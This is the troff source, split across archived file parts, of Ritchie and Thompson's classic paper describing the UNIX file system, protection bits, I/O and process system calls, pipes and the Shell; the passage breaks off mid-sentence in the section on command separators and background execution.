.ti 1
..
.de fo
'bp
..
.de hd
'tl '-'''
'sp .5i
.if e .tl '\fIU\*sNIX\*n Time-Sharing System - %\fP'''
.if o .tl '''\fIU\*sNIX\*n Time-Sharing System - %\fP'
'sp .4i
..
.de s1
.sp 1.7
.ne 5
.ft B
..
.de s2
.sp
.ne 5
.ft B
..
.de es
.sp .2
.ft R
.ti 1
..
.de dc
.sp .5
.ti 1.0i
..
.de ec
.sp .5
..
.de it
'ft I
\\$1
'ft
..
-- /usr/doc/unix/p1 mode=0110664 uid=3 gid=3 atime=170468711 mtime=173059679 --
.wh -1i fo
.sp 1.25i
.wh 0 hd
.ps 16
.ft B
.ce
The U\s14NIX\s16 Time-Sharing System
.ft I
.sp  .3i
.ce 2
\*nDennis M. Ritchie
Ken Thompson

.ce 2
Bell Laboratories
Murray Hill, N. J. 07974
.fi
.ft B
.sp .5i
.ce
ABSTRACT
.sp
.ft R
U\*sNIX\*n is a general-purpose, multi-user, interactive
operating system for the Digital Equipment Corporation
\*sPDP\*n-11/40, 11/45 and 11/70 computers.
It offers a number of features
seldom found even in larger operating
systems, including
.br
.tr |
.de dl
.sp .3
.ti -\w'1.|'u
..
.in .5i
.dl
1.|A hierarchical file system incorporating
demountable volumes,
.dl
2.|Compatible file, device, and inter-process I/O,
.dl
3.|The ability to initiate asynchronous processes,
.dl
4.|System command language selectable on a per-user basis,
.dl
5.|Over 100 subsystems including a dozen languages.
.sp .3
.in 0
.tr ||
This paper discusses the nature
and implementation of the file system
and of the user command interface.
.sp 2.0
.ft B
1. Introduction
.es
There have been three versions of \*sUNIX\*n.
The earliest version (circa 1969-70) ran on
the Digital Equipment Corporation \*sPDP\*n-7 and -9 computers.
The second version ran on the unprotected
\*sPDP\*n-11/20 computer.
This paper describes only the \*sPDP\*n-11/40, /45 and /70\*r system,
since it is more modern and
many of the differences between it and older \*sUNIX\*n systems result from
redesign of features found to be deficient or lacking.
.pg
Since \*sPDP\*n-11 \*sUNIX\*n became operational
in February, 1971,
about 100 installations have been put into service;
they are generally smaller
than the system described here.
Most of them are engaged in applications such as
the preparation and formatting of patent applications
and other textual material,
the collection and processing of trouble data
from various switching machines within the Bell System,
and recording and checking telephone service
orders.
Our own installation is used mainly for research
in operating systems, languages,
computer networks,
and other topics in computer science, and also for
document preparation.
.br
.sp
\l'2i'
.ps 8
.vs 9p
.pg
Copyright \(co 1974,
Association for Computing Machinery, Inc.
General permission to republish,
but not for profit,
all or part of this material
is granted provided that \s7ACM\s8's copyright
notice is given and that reference is made to the publication,
to its date of issue,
and to the fact that reprinting privileges were granted by
permission of the Association for Computing Machinery.
.pg
This is a revised version of an article
appearing in the Communications of the \s7ACM\s8,
Volume 17, Number 7 (July 1974) pp. 365-375.
That article is a
revised version of a paper presented
at the Fourth \s7ACM\s8 Symposium on Operating
Systems Principles,
\s7IBM\s8 Thomas J. Watson Research Center,
Yorktown Heights,
New York,
October 15-17, 1973.
.br
.ps 10
.vs 12p
.bp
.pg
Perhaps the most important achievement of \*sUNIX\*n is to demonstrate
that
a powerful operating system for interactive use
need not be expensive either in equipment or in human
effort:
\*sUNIX\*n can run on hardware costing as little as $40,000, and
less than two man-years were spent on the main system
software.
Yet \*sUNIX\*n contains a number of features
seldom offered even in much larger systems.
Hopefully, however, the users of \*sUNIX\*n will find that the
most important characteristics of the system
are its simplicity, elegance, and ease of use.
.pg
Besides the system proper, the major programs
available under \*sUNIX\*n are
.sp 1.0
.ne 3
.in .75i
.ne 3
.ti .5i
assembler,
.ti .5i
text editor based on \*sQED\*n\*r,
.ti .5i
linking loader,
.ti .5i
symbolic debugger,
.ti .5i
compiler for a language resembling \*sBCPL\*n\*r with types and structures (C),
.ti .5i
interpreter for a dialect of \*sBASIC\*n,
.ti .5i
phototypesetting and equation setting programs
.ti .5i
Fortran compiler,
.ti .5i
Snobol interpreter,
.ti .5i
top-down compiler-compiler (\*sTMG\*n\*r),
.ti .5i
bottom-up compiler-compiler (\*sYACC\*n),
.ti .5i
form letter generator,
.ti .5i
macro processor (M6\*r),
.ti .5i
permuted index program.
.sp .5
.in 0
.fi
There is also a host of maintenance, utility, recreation and novelty programs.
All of these programs were written locally.
It is worth noting that the system is totally self-supporting.
All \*sUNIX\*n software is maintained under \*sUNIX\*n;
likewise, this paper and all other \*sUNIX\*n
documents
were generated and formatted by the \*sUNIX\*n editor and text formatting
program.
.s1
2. Hardware and software environment
.es
The \*sPDP\*n-11/45 on which our \*sUNIX\*n installation is implemented is a 16-bit
word (8-bit byte) computer with 112K bytes of core memory;
\*sUNIX\*n occupies 53K bytes.
This system, however, includes a very large number of
device drivers
and enjoys a generous allotment
of space for I/O buffers and system tables;
a minimal system capable of running the software
mentioned above can
require as little as 64K bytes
of core altogether.
.pg
Our \*sPDP\*n-11 has a 1M byte fixed-head disk, used
for file system storage and swapping,
four moving-head disk drives which each provide 2.5M bytes
on removable disk cartridges,
and a single moving-head disk drive which
uses removable 40M byte disk packs.
There are also a high-speed paper tape reader-punch,
nine-track magnetic tape,
and \*sDEC\*ntape (a variety
of magnetic tape facility in which individual records
may be addressed and rewritten).
Besides the console typewriter, there are 30 variable-speed
communications interfaces
attached to 100-series datasets
and a 201 dataset interface used
primarily for spooling printout to
a communal line printer.
There are also several one-of-a-kind
devices including a Picturephone\(rg interface,
a voice response unit,
a voice synthesizer,
a phototypesetter,
a digital switching network,
and a satellite \*sPDP\*n-11/20
which generates vectors, curves, and characters on a Tektronix
611 storage-tube display.
.pg
The greater part of \*sUNIX\*n software is written in the
above-mentioned C language\*r.
Early versions of the operating system were written in assembly language,
but during the summer of 1973, it was rewritten in C.
The size of the new system is about one third greater
than the old.
Since the new system is not only much easier to
understand and to modify but also
includes
many functional improvements,
including multiprogramming and the ability to
share reentrant code among several user programs,
we considered this increase in size quite acceptable.
.s1
3. The File system
.es
The most important role of \*sUNIX\*n is to provide
a file system.
From the point of view of the user, there
are three kinds of files: ordinary disk files,
directories, and special files.
.s2
3.1 Ordinary files
.es
A file
contains whatever information the user places on it,
for example symbolic or binary
(object) programs.
No particular structuring is expected by the system.
Files of text consist simply of a string
of characters, with lines demarcated by the new-line character.
Binary programs are sequences of words as
they will appear in core memory when the program
starts executing.
A few user programs manipulate files with more
structure;
for example, the assembler generates, and the loader
expects, an object file in a particular format.
However,
the structure of files is controlled by
the programs which use them, not by the system.
.s2
3.2 Directories
.es
Directories provide
the mapping between the names of files
and the files themselves, and thus
induce a structure on the file system as a whole.
Each user has a directory of his own files;
he may also create subdirectories to contain
groups of files conveniently treated together.
A directory behaves exactly like an ordinary file except that it
cannot be written on by unprivileged programs, so that the system
controls the contents of directories.
However, anyone with
appropriate permission may read a directory just like any other file.
.pg
The system maintains several directories
for its own use.
One of these is the \fIroot\fR directory.
All files in the system can be found by tracing
a path through a chain of directories
until the desired file is reached.
The starting point for such searches is often the
root.
Another system directory contains all the programs provided
for general use; that is, all the \fIcommands\fR.
As will be seen, however, it is by no means necessary
that a program reside in this directory for it
to be executed.
.pg
Files are named by sequences of 14 or
fewer characters.
When the name of a file is specified to the
system, it may be in the form of a
.ft I
path name,
.ft R
which
is a sequence of directory names separated by slashes ``\|/\|''
and ending in a file name.
If the sequence begins with a slash, the search begins in the
root directory.
The name \fI/\|alpha\|/\|beta\|/\|gamma\fR causes the system to search
the root for directory \fIalpha,\fR
then to search \fIalpha\fR for \fIbeta,\fR
finally to find \fIgamma\fR in \fIbeta\fR.
\fIGamma\fR may be an ordinary file, a directory, or a special
file.
As a limiting case, the name ``/\|'' refers to the root itself.
.pg
A path name not starting with ``/\|'' causes the system to begin the
search in the user's current directory.
Thus, the name \fIalpha\|/\|beta\fR specifies the file named \fIbeta\fR in
subdirectory \fIalpha\fR of the current
directory.
The simplest kind of name, for example \fIalpha\fR,
refers to a file which itself is found in the current
directory.
As another limiting case, the null file name refers
to the current directory.
.pg
The same non-directory file may appear in several directories under
possibly different names.
This feature is called \fIlinking;\fR
a directory entry for a file is sometimes called a link.
\*sUNIX\*n differs from other systems in which linking is permitted
in that all links to a file have equal status.
That is, a file does not exist within a particular directory;
the directory entry for a file consists merely
of its name and a pointer to the information actually
describing the file.
Thus a file exists independently of any
directory entry, although in practice a file is made to
disappear along with the last link to it.
.pg
Each directory always has at least two entries.
The name
``\|\fB.\|\fR'' in each directory refers to the directory itself.
Thus a program
may read the current directory under the name ``\fB\|.\|\fR'' without knowing
its complete path name.
The name ``\fB\|.\|.\|\fR'' by convention refers to the parent of the
directory in which it appears, that is, to the directory in which
it was created.
.pl +1
.pg
The directory structure is constrained to have the form
of a rooted tree.
Except for the special entries ``\|\fB\|.\|\fR'' and ``\fB\|.\|.\|\fR'', each directory
must appear as an entry in exactly one other, which is its
parent.
The reason for this is to simplify the writing of programs
which visit subtrees of the directory structure, and more
important, to avoid the separation of portions of the hierarchy.
If arbitrary links to directories were permitted, it would
be quite difficult to detect when the last connection from
the root to a directory was severed.
.s2
.pl -1
3.3 Special files
.es
Special files constitute the most unusual feature of the \*sUNIX\*n
file system.
Each I/O device supported by \*sUNIX\*n
is associated with at least one such file.
Special files are read and written just like ordinary
disk files, but requests to read or write result in activation of the associated
device.
An entry for each special file resides in directory \fI/\|dev,\fR
although a link may be made to one of these files
just like an ordinary file.
Thus, for example,
to punch paper tape,
one may write on the file \fI\|/\|dev\|/\|ppt\fR.
Special files exist for each communication line, each disk,
each tape drive,
and for physical core memory.
Of course,
the active disks
and the core special file are protected from
indiscriminate access.
.pg
There is a threefold advantage in treating
I/O devices this way:
file and device I/O
are as similar as possible;
file and device names have the same
syntax and meaning, so that
a program expecting a file name
as a parameter can be passed a device
name; finally,
special files are subject to the same
protection mechanism as regular files.
.s2
3.4 Removable file systems
.es
Although the root of the file system is always stored on the same
device,
it is not necessary that the entire file system hierarchy
reside on this device.
There is a \fImount\fR system request which has two arguments:
the name of an existing ordinary file, and the name of a special
file whose associated
storage volume (e. g. disk pack) should have the structure
of an independent file system
containing its own directory hierarchy.
The effect of \fImount\fR is to cause
references to the heretofore ordinary file
to refer instead to the root directory
of the file system on the removable volume.
In effect, \fImount\fR
replaces a leaf of the hierarchy tree (the ordinary file)
by a whole new subtree (the hierarchy stored on the
removable volume).
After the \fImount\fR,
there is virtually no distinction
between files on the removable volume and those in the
permanent file system.
In our installation, for example,
the root directory resides
on the fixed-head disk,
and the large disk drive, which contains user's files,
is mounted by the system initialization
program;
the four smaller disk drives are available
to users for mounting their
own disk packs.
A mountable file system is generated by
writing on its corresponding special file.
A utility program is available to create
an empty file system,
or one may simply copy an existing file system.
.pg
There is only one exception to the rule of identical
treatment of files on different devices:
no link may exist between one file system hierarchy and
another.
This restriction is enforced so as to avoid
the elaborate bookkeeping
which would otherwise be required to assure removal of the links
when the removable volume is finally dismounted.
In particular, in the root directories of
all file systems, removable or not, the
name
``\fB\|.\|.\|\fR''
refers to the directory itself instead of to its parent.
.s2
3.5 Protection
.es
Although the access control scheme in \*sUNIX\*n
is quite simple, it has some unusual features.
Each user of the system is assigned a unique
user identification number.
When a file is created, it is marked with
the user \*sID\*n of its owner.
Also given for new files
is a set of seven protection bits.
Six of these specify
independently read, write, and execute permission
for the
owner of the file and for all other users.
.pg
If the seventh bit is on, the system
will temporarily change the user identification
of the current user to that of the creator of the file whenever
the file is executed as a program.
This change in user \*sID\*n is effective only
during the execution of the program which calls for it.
The set-user-\*sID\*n feature provides
for privileged programs which may use files
inaccessible to other users.
For example, a program may keep an accounting file
which should neither be read nor changed
except by the program itself.
If the set-user-identification bit is on for the
program, it may access the file although
this access might be forbidden to other programs
invoked by the given program's user.
Since the actual user \*sID\*n
of the invoker of any program
is always available,
set-user-\*sID\*n programs
may take any measures desired to satisfy themselves
as to their invoker's credentials.
This mechanism is used to allow users to execute
the carefully-written
commands
which call privileged system entries.
For example, there is a system entry
invokable only by the ``super-user'' (below)
which creates
an empty directory.
As indicated above, directories are expected to
have entries for ``\fB\|.\|\fR'' and ``\fB\|.\|.\|\fR''.
The command which creates a directory
is owned by the super-user
and has the set-user-\*sID\*n bit set.
After it checks its invoker's authorization to
create the specified directory,
it creates it and makes the entries
for ``\fB\|.\|\fR'' and ``\fB\|.\|.\|\fR''.
.pg
Since anyone may set the set-user-\*sID\*n
bit on one of his own files,
this mechanism is generally
available without administrative intervention.
For example,
this protection scheme easily solves the \*sMOO\*n
accounting problem posed in [\n+r].
.pg
The system recognizes one particular user \*sID\*n (that of the ``super-user'') as
exempt from the usual constraints on file access; thus (for example)
programs may be written to dump and reload the file
system without
unwanted interference from the protection
system.
-- /usr/doc/unix/p2 mode=0110664 uid=3 gid=3 atime=170468717 mtime=173059679 --
.s2
3.6 I/O calls
.es
The system calls to do I/O are designed to eliminate
the differences between the various devices and styles of
access.
There is no distinction between ``random''
and ``sequential'' I/O, nor is any logical record size imposed
by the system.
The size of an ordinary file is determined
by the highest byte written on it;
no predetermination of the size of a file is necessary
or possible.
.pg
To illustrate the essentials of I/O in \*sUNIX\*n, some of the basic calls are
summarized below
in an anonymous language which will
indicate the required parameters without getting into the
complexities of machine language programming.
Each call to the system may potentially result in an error
return, which for simplicity is not represented
in the calling sequence.
.pg
To read or write a file assumed to exist already, it must
be opened by the following call:
.dc
filep = open\|(\|name, flag\|)
.ec
\fIName\fR indicates the name of the file.
An arbitrary path name may be given.
The \fIflag\fR argument indicates whether the file is to be read, written,
or ``updated,'' that is read and written simultaneously.
.pg
The returned value
.ft I
filep
.ft R
is called a
.ft I
file descriptor.
.ft R
It is a small integer used to identify the file
in subsequent calls to read, write
or otherwise manipulate the file.
.pg
To create a new file or completely rewrite an old one,
there is a \fIcreate\fR system call which
creates the given file if it does not exist,
or truncates it to zero length
if it does exist.
\fICreate\fR also opens the new file for writing
and, like \fIopen,\fR returns a file descriptor.
.pg
There are no user-visible locks in the file system, nor is there any
restriction on the number of users who may have a file
open for reading or writing.
Although it is possible for the contents of a file
to become scrambled when two users write on it simultaneously,
in practice difficulties do not arise.
We take the view that locks are neither
necessary nor sufficient, in our environment,
to prevent interference between users of the same file.
They are unnecessary because we are not
faced with large, single-file data bases
maintained by independent processes.
They are insufficient because
locks in the ordinary sense, whereby
one user is prevented from writing on a file which another
user is reading,
cannot prevent confusion
when, for example, both users are editing
a file with an editor which makes
a copy of the file being edited.
.pg
It should be said that the system has
sufficient internal interlocks to maintain
the logical consistency of the file system
when two users engage simultaneously in such inconvenient
activities as writing on
the same file,
creating files in the same directory,
or deleting each other's open files.
.pg
Except as indicated below, reading and writing
are sequential.
This means that if a particular
byte in the file was the last byte written (or read),
the next I/O call implicitly refers to the
first following byte.
For each open file there is a pointer, maintained
by the system,
which indicates the next byte to be read
or written.
If \fIn\fR bytes are read or written, the pointer advances
by \fIn\fR bytes.
.pg
Once a file is open, the following calls
may be used.
.dc
n = read\|(\|filep, buffer, count\|)
.dc
n = write\|(\|filep, buffer, count\|)
.ec
Up to
.ft I
count
.ft R
bytes are transmitted between the file specified
by
.ft I
filep
.ft R
and the byte array
specified by
.ft I
buffer.
.ft R
The returned value
.ft I
n
.ft R
is the number of bytes actually transmitted.
In the
.ft I
write
.ft R
case,
.ft I
n
.ft R
is the same as
.ft I
count
.ft R
except under exceptional conditions like I/O errors or
end of physical medium on special files;
in a
.ft I
read,
.ft R
however,
.ft I
n
.ft R
may without error be less than
.ft I
count.
.ft R
If the read pointer is so near the end of the
file that reading \fIcount\fR characters
would cause reading beyond the end, only sufficient
bytes are transmitted to reach the end of the
file;
also, typewriter-like devices
never return more than one line of input.
When a \fIread\fR call returns with \fIn\fR equal
to zero, it indicates the end of the file.
For disk files this occurs when the read pointer
becomes equal to the current
size of the file.
It is possible to generate an end-of-file
from a typewriter by use of an escape
sequence which depends on the device used.
.pg
Bytes written on a file affect only those implied by
the position of the write pointer and the
count; no other part of the file
is changed.
If the last byte lies beyond the end of the file, the
file is grown as needed.
.pg
To do random (direct access) I/O
it is only necessary to move the read or write pointer
to the appropriate location in the file.
.dc
location = seek\|(\|filep, offset, base\|)
.ec
The pointer
associated with \fIfilep\fR is moved to a position \fIoffset\fR
bytes from the beginning of the file, from the current position
of the pointer, or from the end of the file,
depending on
.ft I
base.
.ft R
.ft I
Offset
.ft R
may be negative.
For some devices (e.g. paper
tape and
typewriters) seek calls are
ignored.
The actual offset from the beginning of the file
to which the pointer was moved is returned
in \fIlocation\fR.
.s2
3.6.1 Other I/O calls
.es
There are several additional system entries
having to do with I/O and with the file
system which will not be discussed.
For example:
close a file,
get the status of a file,
change the protection mode or the owner
of a file,
create a directory,
make a link to an existing file,
delete a file.
.s1
4.  Implementation of the file system
.es
As mentioned in \(sc3.2 above, a directory entry contains
only a name for the associated file and a pointer to the
file itself.
This pointer is an integer called the
.ft I
i-number
.ft
(for index number)
of the file.
When the file is accessed,
its i-number is used as an index into
a system table (the \fIi-list\|\fR) stored in a known
part of the device on which
the directory resides.
The entry thereby found (the file's
\fIi-node\fR\|)
contains
the description of the file:
.sp
.tr |
.in .5i
.ti -\w'1. 'u
1.|its owner;
.ti -\w'1. 'u
2.|its protection bits;
.ti -\w'1. 'u
3.|the physical disk or tape addresses for the file contents;
.ti -\w'1. 'u
4.|its size;
.ti -\w'1. 'u
5.|time of last modification;
.ti -\w'1. 'u
6.|the number of links to the file; that is, the number
of times it appears in a directory;
.ti -\w'1. 'u
7.|a bit indicating whether the
file is a directory;
.ti -\w'1. 'u
8.|a bit indicating whether the file is a special file;
.ti -\w'1. 'u
9.|a bit indicating whether the file is ``large'' or ``small.''
.sp
.tr ||
.in 0
The purpose of an
.ft I
open
.ft R
or
.ft I
create
.ft R
system call is to turn the path name given by the user
into an i-number
by searching the explicitly or implicitly named directories.
Once a file is open,
its device, i-number, and read/write pointer are stored in a system table
indexed by the file descriptor returned by the
.ft I
open
.ft R
or
.ft I
create.
.ft R
Thus the file descriptor supplied during a subsequent
call to read or write the
file
may be easily related to the information necessary to access the file.
.pg
When a new file is created,
an i-node is allocated for it and a directory entry is made
which contains the name of the file and the i-node
number.
Making a link to an existing file involves
creating a directory entry with the new name,
copying the i-number from the original file entry,
and incrementing the link-count field of the i-node.
Removing (deleting) a file is done by
decrementing the
link-count of the i-node specified by its directory entry
and erasing the directory entry.
If the link-count drops to 0,
any disk blocks in the file
are freed and the i-node is deallocated.
.pg
The space on all fixed or removable disks which
contain a file system is divided into a number of
512-byte
blocks logically addressed from 0 up to a limit which
depends on the device.
There is space in the i-node of each file for eight device addresses.
A \fIsmall\fR (non-special) file fits into eight or fewer
blocks; in this case the addresses of the
blocks themselves are stored.
For \fIlarge\fR (non-special) files, seven of the eight device addresses may point
to indirect blocks each containing 256 addresses
for the data blocks of the file.
If required,
the eighth word is the address of a double-indirect block containing 256 more addresses
of indirect blocks.
Thus files may conceptually grow to (7+256)\v'-.3'.\v'.3'256\v'-.3'.\v'.3'512 bytes;
actually they are restricted to
16,777,216
(\|2\u\*t24\*n\d\|) bytes.
Once opened, a small file (size 1 to 8 blocks)
can be accessed directly.
A large file (size 9 to 32768 blocks)
requires one additional access
to read below logical block 1792
(7\v'-.3'.\v'.3'256)
and two additional references above 1792.
.pg
The foregoing discussion applies to ordinary files.
When an I/O request is made to a file whose i-node indicates that it
is special,
the last seven device address words are immaterial,
and the first is interpreted as
a pair of bytes which constitute an internal
.ft I
device name.
.ft R
These bytes specify
respectively a device type
and subdevice number.
The device type indicates which
system routine will deal with I/O on that device;
the subdevice number selects, for example, a disk drive
attached to a particular controller or one of several
similar typewriter interfaces.
.pg
In this environment, the implementation of the
.ft I
mount
.ft R
system call (\(sc3.4) is quite straightforward.
.ft I
Mount
.ft R
maintains a system table whose
argument is the i-number and device name of the
ordinary file specified
during the
.ft I
mount,
.ft R
and whose corresponding value is the
device name of the indicated special file.
This table is searched for each (i-number, device)-pair
which turns up while a path name is being scanned
during an
.it open
or
.it create;
if a match is found,
the i-number is replaced by 1 (which is the i-number of the root
directory on all file systems),
and the device name is replaced by the table value.
.pg
To the user, both reading and writing of files appear to
be synchronous and unbuffered.
That is, immediately after
return from a \fIread\fR call the data are available, and conversely
after a \fIwrite\fR the user's workspace may be reused.
In fact the system maintains a rather complicated
buffering mechanism which reduces greatly the number
of I/O operations required to access a file.
Suppose a \fIwrite\fR call is made specifying transmission
of a single byte.
U\*sNIX\*n will search its buffers to see
whether the affected disk block currently resides in core memory;
if not, it will be read in from the device.
Then the affected byte is replaced in the buffer and an
entry is made in a list of blocks to be written.
The return from the \fIwrite\fR call may then take place,
although the actual I/O may not be completed until a later time.
Conversely, if a single byte is read, the system determines
whether the secondary storage block in which the byte is located is already
in one of the system's buffers; if so, the byte can be returned immediately.
If not, the block is read into a buffer and the byte picked out.
.pg
The system recognizes when
a program has
made accesses to
sequential blocks of a file,
and asynchronously
pre-reads the next block.
This significantly reduces
the running time of most programs
while adding little to
system overhead.
.pg
A program which reads or writes files in units of 512 bytes
has an advantage over a program which reads or writes
a single byte at a time, but the gain is not immense;
it comes mainly from the avoidance of system overhead.
A program which is used rarely or which does
no great volume of I/O may quite reasonably
read and write in units as small as it wishes.
.pg
The notion of the i-list is an unusual feature
of \*sUNIX\*n.
In practice, this method of organizing the file system
has proved quite reliable and easy to deal with.
To the system itself, one of its strengths is
the fact that each file has a short, unambiguous name
which is related in a simple way to the protection, addressing,
and other information needed to access the file.
It also permits a quite simple and rapid
algorithm for checking the consistency of a file system,
for example verification
that the portions of each device containing useful information
and those free to be allocated are disjoint and together
exhaust the space on the device.
This algorithm is independent
of the directory hierarchy, since it need only scan
the linearly-organized i-list.
At the same time the notion of the i-list induces certain
peculiarities not found in other file system organizations.
For example, there is the question of who is to be charged
for the space a file occupies,
since all directory entries for a file have equal status.
Charging the owner of a file is unfair in general,
since one user may create a file, another may link to
it, and the first user may delete the file.
The first user is still the owner of the
file, but it should be charged
to the second user.
The simplest reasonably fair algorithm
seems to be to spread the charges
equally among users who have links to a file.
The current version of \*sUNIX\*n avoids the
issue by not charging any fees at all.
.s2
4.1 Efficiency of the file system
.es
To provide an indication of the overall efficiency
of \*sUNIX\*n and of the file system in particular,
timings were made of the assembly of
a 8848-line program.
The assembly was run alone on the machine;
the total clock time was 32 seconds,
for a rate of 276 lines per second.
The time was divided as follows:
66% assembler execution time,
21% system overhead,
13% disk wait time.
We will not attempt any interpretation of these figures
nor any comparison with other systems, but merely
note that we are
generally satisfied with the overall performance
of the system.
-- /usr/doc/unix/p3 mode=0110664 uid=3 gid=3 atime=170468720 mtime=173059679 --
.s1
5. Processes and images
.es
An
.ft I
image
.ft
is a computer execution environment.
It includes a core image,
general register values,
status of open files,
current directory and the like.
An image is the current state of a pseudo-computer.
.pg
A
.ft I
process
.ft
is the execution of an image.
While the processor is executing on behalf of a process,
the image must reside in core;
during the execution of other processes it remains in core
unless the appearance of an active, higher-priority
process
forces it to be swapped out to the fixed-head disk.
.pg
The user-core part of an image is divided into three logical segments.
The program text segment begins at location 0 in the virtual address space.
During execution, this segment is write-protected
and a single copy of it is shared among
all processes executing the same program.
At the first 8K byte boundary above the program text segment in the
virtual address space begins a non-shared, writable data segment,
the size of which may be extended by a system call.
Starting at the highest
address in the virtual address space is a stack segment,
which automatically grows downward
as the hardware's stack pointer fluctuates.
.s2
5.1 Processes
.es
Except while \*sUNIX\*n is bootstrapping itself into operation, a new
process can come into existence only
by use of the \fIfork\fR system call:
.dc
processid = fork\|(\|label\|)\|
.ec
When \fIfork\fR is executed by a process, it
splits into two independently executing processes.
The two processes have independent
copies of the original core image,
and share any open files.
The new processes differ only in that one is considered
the parent process:
in the parent,
control returns directly from the \fIfork\fR,
while in the child, control is passed
to location
.ft I
label.
.ft R
The \fIprocessid\fR returned by the \fIfork\fR call is the identification
of the other process.
.pg
Because the return points in the parent and child process
are not the same, each image existing after a
\fIfork\fR may determine whether it is the parent or child process.
.s2
5.2 Pipes
.es
Processes may communicate
with related processes using the same system
.ft I
read
.ft
and
.ft I
write
.ft
calls that are used for file system I/O.
The call
.dc
filep = pipe\|(\|\|)\|
.ec
returns a file descriptor \fIfilep\fR and
creates an inter-process channel called a \fIpipe\fR.
This channel, like other open files, is passed from parent to child process in
the image by the \fIfork\fR call.
A \fIread\fR using a pipe file descriptor
waits until another process writes using the
file descriptor for the same pipe.
At this point, data are passed between the images of the
two processes.
Neither process need know that a pipe,
rather than an ordinary file,
is involved.
.pg
Although
inter-process communication
via pipes is a quite valuable tool
(see \(sc6.2),
it is not a completely general
mechanism,
since the pipe must be set up by a common ancestor
of the processes involved.
.s2
5.3 Execution of programs
.es
Another major system primitive
is invoked by
.dc
execute\|(\|file, arg\*t\d1\u\*n, arg\*t\d2\u\*n, .\|.\|. , arg\*t\dn\u\*n\|)\|
.ec
which requests the system to read in and execute the program
named by \fIfile\fR, passing it string arguments
.ft I
arg\v'.3'\*t1\*n\v'-.3'\|, arg\v'.3'\*t2\*n\v'-.3'\|, .\|.\|.\|\|, arg\v'.3'\*tn\*n\v'-.3'.
.ft R
All the code and data in the process using \fIexecute\fR
is replaced from the \fIfile\fR,
but
open files, current directory, and
inter-process relationships are unaltered.
Only if the call fails, for example
because \fIfile\fR could not be found or because
its execute-permission bit was not set, does a return
take place from the \fIexecute\fR
primitive;
it resembles a ``jump'' machine instruction
rather than a subroutine call.
.s2
5.4 Process synchronization
.es
Another process control system call
.dc
processid = wait\|(\|\|)\|
.ec
causes its caller to suspend
execution until one of its children has completed execution.
Then \fIwait\fR returns the \fIprocessid\fR of the terminated process.
An error return is taken if the calling process has no
descendants.
Certain status from the child process
is also available.
.s2
5.5 Termination
.es
Lastly,
.dc
exit\|(\|status\|)\|
.ec
terminates a process,
destroys its image,
closes its open files,
and generally obliterates it.
When the parent is notified through
the \fIwait\fR primitive,
the indicated \fIstatus\fR is available
to the parent.
Processes may also terminate as a result of
various illegal actions or user-generated signals
(\(sc7 below).
-- /usr/doc/unix/p4 mode=0110664 uid=3 gid=3 atime=170468724 mtime=173059679 --
.s1
6. The Shell
.es
For most users,
communication with \*sUNIX\*n is carried on with the
aid of a program called the Shell.
The Shell is a command
line interpreter: it reads lines typed by the user and
interprets them as requests to execute
other programs.
In simplest form, a command line consists of the command
name followed by arguments to the command, all separated
by spaces:
.dc
command arg\*t\d1\u\*n arg\*t\d2\u\*n .\|.\|. arg\*t\dn\u\*n
.ec
The Shell splits up the command name and the arguments into
separate strings.
Then a file with name \fIcommand\fR is sought;
\fIcommand\fR may be a path name including the ``/'' character to
specify any file in the system.
If \fIcommand\fR is found, it is brought into
core and executed.
The arguments
collected by the Shell are accessible
to the command.
When the command is finished, the Shell
resumes its own execution, and indicates its readiness
to accept another command by typing a prompt character.
.pg
If file \fIcommand\fR cannot be found,
the Shell prefixes the string  \fI/\|bin/\fR  to \fIcommand\fR and
attempts again to find the file.
Directory \fI/\|bin\fR contains all the commands
intended to be generally used.
.s2
6.1 Standard I/O
.es
The discussion of I/O in \(sc3 above seems to imply that
every file used by a program must be opened or created by the program in
order to get a file descriptor for the file.
Programs executed by the Shell, however, start off with
two open files which have file descriptors
0 and 1.
As such a program begins execution, file 1 is open for writing,
and is best understood as the standard output file.
Except under circumstances indicated below, this file
is the user's typewriter.
Thus programs which wish to write informative or diagnostic
information ordinarily use file descriptor 1.
Conversely, file 0 starts off open for reading, and programs which
wish to read messages typed by the user usually
read this file.
.pg
The Shell is able to change the standard assignments of
these file descriptors from the
user's typewriter printer and keyboard.
If one of the
arguments to a command is prefixed by ``>'', file descriptor
1 will, for the duration of the command, refer to the
file named after the ``>''.
For example,
.dc
ls
.ec
ordinarily lists, on the typewriter, the names of the files in the current
directory.
The command
.dc
ls >there
.ec
creates a file called \fIthere\fR and places the listing there.
Thus the argument ``>there'' means, ``place output on \fIthere\fR.''
On the other hand,
.dc
ed
.ec
ordinarily enters the editor, which takes requests from the
user via his typewriter.
The command
.dc
ed <script
.ec
interprets \fIscript\fR as a file of editor commands;
thus ``<script'' means, ``take input from \fIscript\fR.''
.pg
Although the file name following ``<'' or ``>'' appears
to be an argument to the command, in fact it is interpreted
completely by the Shell and is not passed to the
command at all.
Thus no special coding to handle I/O redirection is needed within each
command; the command need merely use the standard file
descriptors 0 and 1 where appropriate.
.s2
6.2 Filters
.es
An extension of the standard I/O notion is used
to direct output from one command to
the input of another.
A sequence of commands separated by
vertical bars causes the Shell to
execute all the commands simultaneously and to arrange
that the standard output of each command
be delivered to the standard input of
the next command in the sequence.
Thus in the command line
.dc
ls | pr \(mi2 | opr
.ec
.it ls
lists the names of the files in the current directory;
its output is passed to \fIpr\fR,
which
paginates its input with dated headings.
The argument ``\(mi2'' means
double column.
Likewise the output from \fIpr\fR is input to \fIopr\fR.
This command spools its input onto a file for off-line
printing.
.pg
This procedure could have been carried out
more clumsily by
.dc
ls >temp1
.ti 1i
pr \(mi2 <temp1 >temp2
.ti 1i
opr <temp2
.ec
followed by removal of the temporary files.
In the absence of the ability
to redirect output and input,
a still clumsier method would have been to
require the
.it ls
command
to accept user requests to paginate its output,
to print in multi-column format, and to arrange
that its output be delivered off-line.
Actually it would be surprising, and in fact
unwise for efficiency reasons,
to expect authors of
commands such as
.it ls
to provide such a wide variety of output options.
.pg
A program
such as \fIpr\fR
which copies its standard input to its standard output
(with processing)
is called a \fIfilter\fR.
Some filters which we have found useful
perform
character transliteration,
sorting of the input,
and encryption and decryption.
.s2
6.3 Command Separators; Multitasking
.es
Another feature provided by the Shell is relatively straightforward.
Commands need not be on different lines; instead they may be separated
by semicolons.
.dc
ls; ed
.ec
will first list the contents of the current directory, then enter
the editor.
.pg
A related feature is more interesting.
If a command is followed
by ``&'', the Shell will not wait for the command to finish before
prompting again; instead, it is ready immediately
to accept a new command.
For example,
.dc
as source >output &
.ec
causes \fIsource\fR to be assembled, with diagnostic
output going to \fIoutput;\fR no matter how long the
